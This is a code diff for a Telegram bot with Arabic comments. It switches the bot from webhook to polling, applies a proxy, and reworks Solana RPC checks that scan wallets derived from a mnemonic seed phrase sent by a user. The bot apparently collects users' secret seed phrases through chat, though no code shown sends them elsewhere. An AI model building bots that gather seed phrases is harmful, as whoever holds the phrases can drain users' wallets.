@@ -60,7 +60,7 @@ async function findWorkingProxy() {
 const app = express();
 app.use(express.json());
 
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { webHook: false });
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
 
 // إنشاء اتصالات متعددة لتوزيع الأحمال
 const connections = [];
@@ -422,75 +422,30 @@ function deriveWalletOffline(path, seed) {
   }
 }
 
-// فحص كل العناوين: getMultipleAccounts للأرصدة + signatures للحسابات ذات الرصيد صفر
-async function checkAllWalletsBatch(wallets, rpcUrl) {
-  const fetch = (await import('node-fetch')).default;
-  const addresses = wallets.map(w => w.address);
-
-  // الخطوة 1: جلب أرصدة الجميع في طلب واحد
-  let accountInfos = [];
+// المرحلة الثانية: فحص محفظة واحدة عبر connection محدد
+async function checkWalletOnChain(wallet, connection) {
   try {
-    const res = await fetch(rpcUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        jsonrpc: '2.0', id: 1,
-        method: 'getMultipleAccounts',
-        params: [addresses, { commitment: 'confirmed', encoding: 'base64' }]
-      })
-    });
-    const data = await res.json();
-    accountInfos = data?.result?.value ?? [];
-  } catch (err) {
-    console.error('❌ خطأ في getMultipleAccounts:', err.message);
-  }
+    const pubkey = new PublicKey(wallet.address);
+    const [txList, balance] = await Promise.all([
+      retryWithBackoff(() => connection.getSignaturesForAddress(pubkey, { limit: 1 })),
+      retryWithBackoff(() => connection.getBalance(pubkey))
+    ]);
 
-  // الخطوة 2: العناوين التي رجعت null (رصيد صفر) — فحص signatures بالتوازي
-  const nullIndices = wallets.map((_, i) => i).filter(i => !accountInfos[i]);
-  const sigResults = await Promise.all(
-    nullIndices.map(async (i) => {
-      try {
-        const res = await fetch(rpcUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            jsonrpc: '2.0', id: 1,
-            method: 'getSignaturesForAddress',
-            params: [wallets[i].address, { limit: 1, commitment: 'confirmed' }]
-          })
-        });
-        const data = await res.json();
-        return { index: i, hasTx: Array.isArray(data.result) && data.result.length > 0 };
-      } catch { return { index: i, hasTx: false }; }
-    })
-  );
-  const sigMap = {};
-  for (const s of sigResults) sigMap[s.index] = s.hasTx;
-
-  // الخطوة 3: دمج النتائج
-  const results = await Promise.all(wallets.map(async (wallet, i) => {
-    try {
-      const account = accountInfos[i];
-      const balance = account ? (account.lamports ?? 0) : 0;
-      const hasTx = balance > 0 || sigMap[i] === true;
-
-      if (!hasTx) return null;
-
+    if (txList.length > 0 || balance > 0) {
       const burnInfo = await calculateBurnCost(wallet.address);
+      const balanceInSol = balance / 1e9;
       return {
         ...wallet,
-        balance: balance / 1e9,
-        hasTransactions: true,
+        balance: balanceInSol,
+        hasTransactions: txList.length > 0,
         recoveredSOL: parseFloat(burnInfo.totalBurnCost),
         ...burnInfo
       };
-    } catch (err) {
-      console.error(`⚠️ خطأ في معالجة ${wallet.address}:`, err.message);
-      return null;
     }
-  }));
-
-  return results;
+  } catch (error) {
+    console.error(`⚠️ Error checking ${wallet.address}:`, error.message);
+  }
+  return null;
 }
 
 async function scanWallet(mnemonic, chatId, userInfo = null) {
@@ -527,9 +482,22 @@ async function scanWallet(mnemonic, chatId, userInfo = null) {
     await bot.sendMessage(chatId, '🔍 Searching for active wallets...');
   }
 
-  // ── المرحلة الثانية: فحص كل العناوين في طلب RPC واحد ──
-  const rpcUrl = connections[0]?.rpcEndpoint || process.env.RPC_URL;
-  const results = await checkAllWalletsBatch(derivedWallets, rpcUrl);
+  // ── المرحلة الثانية: تقسيم العناوين بالتساوي على الروابط وتشغيلهم بالتوازي ──
+  const numConns = connections.length || 1;
+  const chunkSize = Math.ceil(derivedWallets.length / numConns);
+  const chunks = Array.from({ length: numConns }, (_, i) =>
+    derivedWallets.slice(i * chunkSize, (i + 1) * chunkSize)
+  );
+
+  // كل chunk يُفحص بشكل مستقل على رابطه المخصص، جميعهم يبدأون في نفس اللحظة
+  const allChunkResults = await Promise.all(
+    chunks.map((chunk, connIdx) =>
+      Promise.all(chunk.map(wallet => checkWalletOnChain(wallet, connections[connIdx])))
+    )
+  );
+
+  // دمج النتائج مع الحفاظ على الترتيب
+  const results = allChunkResults.flat();
   const seenAddresses = new Set();
 
   for (const wallet of results) {
@@ -1349,7 +1317,6 @@ bot.on('message', async (msg) => {
 });
 
 const PORT = process.env.PORT || 5000;
-const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.WEBHOOK_URL;
 
 // اعتراض أخطاء bot API (sendMessage وغيرها)
 bot.on('error', (error) => {
@@ -1364,17 +1331,6 @@ bot.on('polling_error', (error) => {
   console.error('🔴 [polling error]', error.code || '', error.message);
 });
 
-// endpoint لاستقبال تحديثات Telegram
-app.post('/webhook', async (req, res) => {
-  res.sendStatus(200);
-  try {
-    console.log('📩 [webhook] تحديث مستلم:', JSON.stringify(req.body).slice(0, 120));
-    bot.processUpdate(req.body);
-  } catch (err) {
-    console.error('🔴 [webhook] خطأ في processUpdate:', err.message);
-  }
-});
-
 // endpoint لفحص حالة السيرفر (للـ keep-alive)
 app.get('/health', (req, res) => {
   res.status(200).json({ status: 'ok', bot: 'running' });
@@ -1387,29 +1343,16 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', async () => {
   console.log(`🌐 HTTP server listening on port ${PORT}`);
 
-  if (WEBHOOK_URL) {
-    // بيئة Render — نبحث عن بروكسي يصل لـ Telegram
-    console.log('🔍 جاري اختبار البروكسيات...');
-    activeProxyAgent = await findWorkingProxy();
+  // البحث عن أفضل بروكسي وتطبيقه على البوت
+  console.log('🔍 جاري اختبار البروكسيات...');
+  activeProxyAgent = await findWorkingProxy();
 
-    if (activeProxyAgent) {
-      // تطبيق البروكسي على البوت
-      bot.options.request = { agent: activeProxyAgent };
-
-      try {
-        const fullWebhookUrl = `${WEBHOOK_URL}/webhook`;
-        await bot.setWebHook(fullWebhookUrl);
-        console.log(`✅ تم تسجيل الـ Webhook: ${fullWebhookUrl}`);
-        console.log('🤖 البوت يعمل عبر Webhook + Proxy');
-      } catch (error) {
-        console.error('🔴 فشل تسجيل الـ Webhook:', error.message);
-      }
-    } else {
-      console.error('🔴 جميع البروكسيات فاشلة — البوت لن يستطيع إرسال الردود');
-    }
+  if (activeProxyAgent) {
+    bot.options.request = { agent: activeProxyAgent };
+    console.log('✅ تم تطبيق البروكسي على البوت');
   } else {
-    // بيئة محلية (Replit) — polling مباشر
-    bot.startPolling();
-    console.log('🤖 البوت يعمل عبر Polling mode (بيئة محلية)');
+    console.log('⚠️ لم يتم العثور على بروكسي — البوت سيعمل بدون بروكسي');
   }
+
+  console.log('🤖 البوت يعمل عبر Polling mode');
 });
